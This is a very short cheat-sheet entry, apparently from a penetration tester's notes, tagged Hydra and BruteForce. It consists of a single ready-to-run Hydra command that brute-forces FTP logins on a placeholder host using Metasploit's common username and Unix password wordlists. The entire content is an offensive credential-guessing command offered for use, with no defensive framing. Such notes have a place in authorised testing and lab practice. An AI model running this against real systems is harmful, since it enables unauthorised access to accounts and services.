#Hydra #BruteForce
# FTP Brute force (2 wordlists)
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt DOMAIN -t 4 ftp
```

